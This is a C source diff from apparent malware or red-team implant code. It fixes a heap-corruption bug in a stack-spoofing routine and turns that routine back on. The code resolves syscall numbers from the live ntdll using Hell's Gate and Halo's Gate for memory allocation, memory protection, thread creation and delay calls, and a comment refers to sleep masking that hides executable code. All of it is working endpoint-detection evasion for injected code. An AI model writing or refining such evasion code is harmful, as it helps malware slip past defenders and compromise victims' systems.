@@ -358,20 +358,21 @@ static void *spoof_make_stub(unsigned short ssn) {
 /* ── Public API ───────────────────────────────────────────────────────────── */
 
 void init_stack_spoof(void) {
-    /* Load a clean ntdll copy to read unhooked SSN bytes */
-    HMODULE ntdll_clean = LoadLibraryExW(L"ntdll.dll", NULL,
-                                         DONT_RESOLVE_DLL_REFERENCES);
-    if (!ntdll_clean)
-        ntdll_clean = GetModuleHandleA("ntdll.dll");
-
+    /* Use the already-loaded ntdll for SSN resolution.
+     * Previously used LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) to get a
+     * "clean" copy, but that caused heap corruption (FTH abcc): the loader
+     * makes internal heap allocations for the module entry that are left
+     * incomplete, corrupting the process heap. On unhooked targets the live
+     * ntdll stubs have the standard 4C 8B D1 B8 pattern and no second copy
+     * is needed; Halo's Gate neighbours handle the hooked-stub fallback. */
     HMODULE ntdll_live = GetModuleHandleA("ntdll.dll");
     if (!ntdll_live) return;
 
     /* Resolve SSNs (Hell's Gate / Halo's Gate) */
-    unsigned short ssn_alloc = spoof_get_ssn(ntdll_clean, "NtAllocateVirtualMemory");
-    unsigned short ssn_prot  = spoof_get_ssn(ntdll_clean, "NtProtectVirtualMemory");
-    unsigned short ssn_thr   = spoof_get_ssn(ntdll_clean, "NtCreateThreadEx");
-    unsigned short ssn_delay = spoof_get_ssn(ntdll_clean, "NtDelayExecution");
+    unsigned short ssn_alloc = spoof_get_ssn(ntdll_live, "NtAllocateVirtualMemory");
+    unsigned short ssn_prot  = spoof_get_ssn(ntdll_live, "NtProtectVirtualMemory");
+    unsigned short ssn_thr   = spoof_get_ssn(ntdll_live, "NtCreateThreadEx");
+    unsigned short ssn_delay = spoof_get_ssn(ntdll_live, "NtDelayExecution");
 
     /* Scan live (in-memory) ntdll for both gadgets */
     ULONG_PTR base = (ULONG_PTR)ntdll_live;
@@ -416,9 +417,7 @@ void evasion_init(void) {
     g_VProt   = (VProt_t)  GetProcAddress(k32,   "VirtualProtect");
     g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
     find_text();
-    /* init_stack_spoof disabled: causes heap corruption (FTH abcc / 0xC0000005
-     * at ntdll+0x4ab8) on Windows targets.  The spoof globals (g_NtAllocVM etc.)
-     * are set here but never called anywhere, so disabling costs nothing. */
+    init_stack_spoof();
 }
 
 /* ── sleep_masked lives in .evasn — executes while .text is PAGE_NOACCESS ─
